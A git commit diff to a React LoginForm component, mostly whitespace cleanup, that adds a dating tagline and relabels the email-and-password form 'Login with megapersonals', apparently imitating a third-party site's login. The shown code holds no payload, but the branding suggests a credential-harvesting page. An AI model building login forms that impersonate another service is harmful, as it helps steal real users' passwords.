8eb0375cb399eb518affd3edda107478dbd61381
Zayn Yusuf <yusue786@gmail.com>
2024-08-11 18:01:55 +0600

    adding text

--- components/LoginForm.js
+++ components/LoginForm.js
@@ -5,8 +5,6 @@ import { useState } from "react";
 import { toast } from "react-toastify";
 
 function LoginForm({ setShowModal }) {
- 
-
   const initialvalues = {
     email: "",
     password: "",
@@ -16,7 +14,7 @@ function LoginForm({ setShowModal }) {
   const { login } = useMockLogin({ setShowModal });
 
   const handleSubmit = (values, formik) => {
-    const { email, password  } = values;
+    const { email, password } = values;
 
     // console.log("values", values);
     // return;
@@ -33,12 +31,15 @@ function LoginForm({ setShowModal }) {
 
     // console.log(submitValues);
   };
- 
 
   return (
     <div className="px-5 lg:px-10 pt-5 pb-10 md:w-[420px] bg-white w-[400px] shadow-lg rounded-lg">
+      <p>
+        Know each other and enjoy private, secure and hasslefree live moment
+        with your dating partner
+      </p>
       <h3 className="text-[25px] font-bold text-[#222222] text-center lg:text-left">
-        Log in to your account
+        Login with megapersonals
       </h3>
 
       <div className="mt-5">
@@ -56,24 +57,22 @@ function LoginForm({ setShowModal }) {
                 type="email"
                 required
               />
-                 
-                  <Field
-                    className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
-                    placeholder="Password"
-                    name="password"
-                    type="password"
-                    autoComplete="on"
-                    required
-                  />
 
-                  <button
-                    type="submit"
-                    className="mt-5 w-full text-lg font-medium bg-[#00BE70] hover:bg-[#00BE70] py-[10px] text-white transition duration-300 rounded"
-                  >
-                    Log in
-                  </button>
-                
-      
+              <Field
+                className="mt-5 w-full text-lg  px-[8px] py-[7px] outline-none border border-[#1a73e8] shadow-inner placeholder:font-medium placeholder:text-black/50"
+                placeholder="Password"
+                name="password"
+                type="password"
+                autoComplete="on"
+                required
+              />
+
+              <button
+                type="submit"
+                className="mt-5 w-full text-lg font-medium bg-[#00BE70] hover:bg-[#00BE70] py-[10px] text-white transition duration-300 rounded"
+              >
+                Log in
+              </button>
             </Form>
           )}
         </Formik>
